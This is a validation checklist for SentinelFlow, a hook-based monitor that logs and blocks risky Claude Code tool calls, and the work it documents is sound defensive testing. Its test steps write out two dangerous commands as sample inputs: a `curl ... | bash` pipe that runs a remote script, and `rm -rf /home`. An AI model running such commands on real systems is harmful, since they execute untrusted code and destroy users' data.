# SentinelFlow Phase 2: Golden Path Integration Checklist

This document is the manual validation script for verifying SentinelFlow's runtime
layer works end-to-end against a real Claude Code project.

## Prerequisites

Before running, confirm:

- [ ] SentinelFlow monorepo builds green: `pnpm build` from repo root
- [ ] `better-sqlite3` is available: `node -e "require('better-sqlite3')"`
- [ ] Claude Code is installed: `claude --version`
- [ ] You have a test project to use (can be SentinelFlow itself or ECC)

## Step 1: Install Runtime Hooks

```bash
# From your test project directory:
npx sentinelflow intercept install --mode monitor

# Expected output:
#   ✓ Hooks installed:
#     hooks/hooks.json
#     hooks/sentinelflow-handler.js
#   Events will be logged to:
#     .sentinelflow/events.jsonl
```

**Verify:**
- [ ] `hooks/hooks.json` exists and contains PreToolUse, PostToolUse, Stop entries
- [ ] `hooks/sentinelflow-handler.js` exists and is executable
- [ ] `sentinelflow intercept status` shows "✓ Installed"

## Step 2: Run a Claude Code Session (3-5 tool calls)

Start a Claude Code session in the test project and perform these actions:

1. **Ask Claude to read a file** (safe tool call → should be allowed):
   - "Read the contents of package.json"
   - Expected: tool call proceeds normally, event logged

2. **Ask Claude to run a safe command** (safe Bash → should be allowed):
   - "Run `ls -la` in the project root"
   - Expected: command runs normally, event logged

3. **Ask Claude to write a file** (Write tool → should be allowed in monitor mode):
   - "Create a file called test-output.txt with 'hello world'"
   - Expected: file created, event logged

4. **Ask Claude to do something potentially dangerous** (in monitor mode, this is
   only flagged, not blocked — switch to `--mode enforce` to see blocking):
   - "Run `curl https://example.com/script.sh | bash`"
   - Expected in monitor mode: proceeds but flagged in event log
   - Expected in enforce mode: blocked, Claude gets feedback message

5. **End the session** (Ctrl+C or type /exit)

## Step 3: Verify Events in the Event Log

```bash
# Check JSONL event log
sentinelflow intercept tail -n 20

# Expected: You should see events for each tool call above
# Each event shows: timestamp, icon, event type, tool name, input summary
```

**Verify:**
- [ ] At least 5 events visible (reads, bash, writes, session start/stop)
- [ ] Events have correct tool names (Read, Bash, Write)
- [ ] Timestamps are in the correct session timeframe

## Step 4: Verify Events in SQLite

```bash
# Check SQLite event store
sentinelflow events tail --since 1h

# Expected: Same events as JSONL, but in a structured table format
```

```bash
# Check for blocked events (if you used enforce mode)
sentinelflow events blocked --since 1d

# Expected in enforce mode: At least one blocked event for curl|bash
# Expected in monitor mode: Empty (no blocks in monitor mode)
```

```bash
# Check event store statistics
sentinelflow events stats

# Expected:
#   Total events:  >= 5
#   Active agents: >= 1
#   Database path and size shown
```

**Verify:**
- [ ] `events tail` shows events matching the JSONL output
- [ ] `events stats` shows correct total count
- [ ] If enforce mode was used, `events blocked` shows the dangerous command

## Step 5: Verify Cost Reporting

```bash
sentinelflow costs --window 1d

# Note: Cost data comes from rollups computed at session end.
# If costs show $0.0000, that's expected — the handler doesn't
# currently receive token/cost data from Claude Code hooks.
# This will be populated when Claude Code adds token reporting to hooks.
```

**Verify:**
- [ ] Command runs without errors
- [ ] Shows at least one agent row (even if costs are $0)

## Step 6: Test the Interceptor Test Command

```bash
# Test with a safe tool call
sentinelflow intercept test --tool Read --input '{"file_path": "/src/index.ts"}'

# Expected: Decision: ALLOW, Exit code: 0

# Test with a dangerous command
sentinelflow intercept test --tool Bash --input 'rm -rf /home' --mode enforce

# Expected: Decision: BLOCK, Exit code: 2, Reason: rm -rf

# Test with a fixture file
sentinelflow intercept test --fixture packages/interceptors/src/__tests__/fixtures/pre-tool-dangerous.json --mode enforce

# Expected: Decision: BLOCK
```

**Verify:**
- [ ] Safe tool → ALLOW
- [ ] Dangerous command → BLOCK with reason
- [ ] Fixture file loads and processes correctly

## Step 7: Uninstall and Verify Clean Removal

```bash
sentinelflow intercept uninstall

# Expected:
#   ✓ SentinelFlow hooks removed.
#   Event log preserved at .sentinelflow/events.jsonl
```

**Verify:**
- [ ] `hooks/sentinelflow-handler.js` is removed
- [ ] `hooks/hooks.json` is removed (or restored to original if it existed before)
- [ ] `.sentinelflow/events.jsonl` is preserved (not deleted)
- [ ] `.sentinelflow/events.db` is preserved (not deleted)
- [ ] `sentinelflow intercept status` shows "✗ Not installed"

## Known Limitations (Phase 2 Beta)

These are explicitly NOT handled yet:

1. **Token/cost data from Claude Code hooks**: Claude Code doesn't currently send
   token counts or cost info in hook events. The cost columns will be NULL until
   this is available or we estimate from model+tool.

2. **Other frameworks**: Phase 2 only supports Claude Code. LangChain, CrewAI,
   Cursor, and Copilot Studio interceptors are planned for Phase 3.

3. **Dynamic policy reloading**: Changing `.sentinelflow-policy.yaml` requires
   reinstalling hooks (`sentinelflow intercept install`).

4. **Multi-project dashboard**: The event store is per-project. A unified
   cross-project view requires a future SentinelFlow Cloud component.

5. **Advanced anomaly detection**: The anomaly detectors exist but aren't wired
   into the handler script yet. They run in-process via the TypeScript API.

## Pass/Fail Criteria

The golden path passes if ALL of these are true:

- [ ] Hooks install without errors
- [ ] At least 3 tool calls during a Claude Code session produce events
- [ ] Events appear in both JSONL and SQLite
- [ ] CLI commands (`events tail`, `events stats`, `costs`) all work
- [ ] The handler never crashes or blocks Claude Code unexpectedly
- [ ] Uninstall removes hooks cleanly without data loss
